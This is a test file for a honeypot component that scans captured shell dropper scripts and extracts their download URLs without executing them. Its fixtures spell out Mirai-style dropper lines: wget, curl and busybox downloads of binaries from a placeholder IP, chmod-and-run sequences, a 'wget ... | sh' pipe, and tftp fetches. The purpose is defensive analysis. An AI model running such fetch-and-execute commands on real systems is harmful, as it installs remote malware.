"""Tests for stage-two script scanning (honeypot/fetcher/script_scan.py).

Pure text in, URLs out: nothing here (or in the module) runs a script.
"""
from __future__ import annotations

import time

from honeypot.fetcher.script_scan import looks_like_script, scan_script


def _urls(text: str, max_urls: int = 30) -> list[str]:
    return scan_script(text, max_urls).urls


def test_literal_download_commands_are_found_in_order():
    script = """#!/bin/sh
cd /tmp || cd /var/run
wget http://1.2.3.4/bins/a.arm -O a.arm; chmod +x a.arm; ./a.arm
busybox wget http://1.2.3.4/bins/a.mips
/bin/busybox wget http://1.2.3.4/bins/a.x86 -O x
curl -s -o a.ppc http://1.2.3.4/bins/a.ppc
wget -q -O- http://1.2.3.4/run.sh | sh
"""
    assert _urls(script) == [
        "http://1.2.3.4/bins/a.arm", "http://1.2.3.4/bins/a.mips", "http://1.2.3.4/bins/a.x86",
        "http://1.2.3.4/bins/a.ppc", "http://1.2.3.4/run.sh",
    ]


def test_urls_are_deduplicated_and_comments_ignored():
    script = "# wget http://1.2.3.4/commented\nwget http://1.2.3.4/a\nwget http://1.2.3.4/a\n"
    assert _urls(script) == ["http://1.2.3.4/a"]


def test_tftp_ftp_and_unresolvable_downloads_are_counted_not_fetched():
    script = (
        "tftp -g -r t.sh 1.2.3.4\n"
        "wget http://$UNSET/x\n"
        "wget http://$(cat /tmp/host)/x\n"
        "wget ftp://1.2.3.4/x\n"
    )
    scan = scan_script(script, 30)
    assert scan.urls == []
    assert scan.skipped == 4


def test_variable_assignment_and_substitution():
    script = 'HOST=1.2.3.4\nBASE="http://$HOST/bins"\nexport NAME=mirai\nwget ${BASE}/$NAME.arm\n'
    assert _urls(script) == ["http://1.2.3.4/bins/mirai.arm"]


def test_one_line_for_loop_expands_per_value():
    script = "for a in arm mips riscv64; do wget http://1.2.3.4/bins/x.$a -O x.$a; done\n"
    assert _urls(script) == [f"http://1.2.3.4/bins/x.{a}" for a in ("arm", "mips", "riscv64")]


def test_multi_line_for_loop_with_variable_list():
    script = """ARCHS="arm arm7 riscv64"
for a in $ARCHS
do
    wget http://1.2.3.4/bins/x.$a
    chmod +x x.$a
done
wget http://1.2.3.4/after
"""
    # Like a shell, an unquoted variable in the word list is split on spaces.
    assert _urls(script) == [
        "http://1.2.3.4/bins/x.arm", "http://1.2.3.4/bins/x.arm7", "http://1.2.3.4/bins/x.riscv64",
        "http://1.2.3.4/after",
    ]


def test_for_loop_over_literal_words_multiline():
    script = "for a in arm mips\ndo\n  wget http://1.2.3.4/x.$a\ndone\n"
    assert _urls(script) == ["http://1.2.3.4/x.arm", "http://1.2.3.4/x.mips"]


def test_loop_variable_does_not_leak_out_of_the_loop():
    script = "for a in arm; do wget http://1.2.3.4/x.$a; done\nwget http://1.2.3.4/y.$a\n"
    scan = scan_script(script, 30)
    assert scan.urls == ["http://1.2.3.4/x.arm"]
    assert scan.skipped == 1


def test_loop_over_unresolved_values_yields_nothing():
    assert _urls("for a in $(ls /); do wget http://1.2.3.4/$a; done\n") == []


def test_max_urls_is_enforced():
    script = "\n".join(f"wget http://1.2.3.4/f{i}" for i in range(100))
    assert len(_urls(script, max_urls=5)) == 5


def test_loop_expansion_is_bounded():
    words = " ".join(f"w{i}" for i in range(1000))
    assert len(_urls(f"for a in {words}; do wget http://1.2.3.4/$a; done\n", max_urls=500)) == 64


def test_hostile_input_is_cheap():
    start = time.monotonic()
    scan_script("a;" * 200_000 + "\n" + "'" * 100_000 + "\n" + "$" * 100_000, 30)
    scan_script("for a in " + "x " * 50_000 + "; do " * 1000, 30)
    scan_script("A=" + "B" * 200_000, 30)
    assert time.monotonic() - start < 3.0


def test_looks_like_script():
    assert looks_like_script(b"#!/bin/sh\nwget http://x/y\n")
    assert looks_like_script(b"cd /tmp; wget http://x/y\n")   # no shebang
    assert not looks_like_script(b"")
    assert not looks_like_script(b"\x7fELF" + b"a" * 100)
    assert not looks_like_script(b"plain text\x00with a nul byte")
    assert not looks_like_script(bytes(range(256)) * 20)
